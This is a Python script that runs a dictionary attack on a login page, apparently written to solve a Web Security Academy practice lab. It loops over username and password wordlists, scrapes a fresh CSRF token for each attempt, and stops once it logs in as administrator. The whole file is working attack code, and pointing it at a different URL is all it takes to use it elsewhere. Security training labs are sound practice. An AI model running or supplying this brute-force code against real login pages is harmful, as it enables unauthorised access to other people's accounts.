import requests
import sys
from bs4 import BeautifulSoup
url = "https://0a0d000a0448099ec01a47d60083008d.web-security-academy.net/login"
needle = "Your username is: administrator"
username_file = "usernames.txt"
password_file = "passwords.txt"

with open(username_file,'r',encoding='utf-8') as usernames:
    for username in usernames:
        username = username.strip('\n').encode()
        with open(password_file,'r',encoding='utf-8') as passwords:
            for password in passwords:
                password = password.strip('\n').encode()
                sys.stdout.write(f"Attempting {username.decode()}:{password.decode()}")
                sys.stdout.flush()
                s = requests.Session()
                r = s.get(url)
                bs = BeautifulSoup(r.text, 'html.parser')
                token = bs.find('input', {'name':'csrf'})['value']
                data = {'csrf': token,'username': username,'password': password}
                r = s.post(url,data=data)
                if needle.encode() in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write(f"Found Match for {username.decode()}:{password.decode()}") 
                    sys.exit()
            sys.stdout.flush()
            sys.stdout.write("\n")
            sys.stdout.write("\tNo valid username:password combination found")
        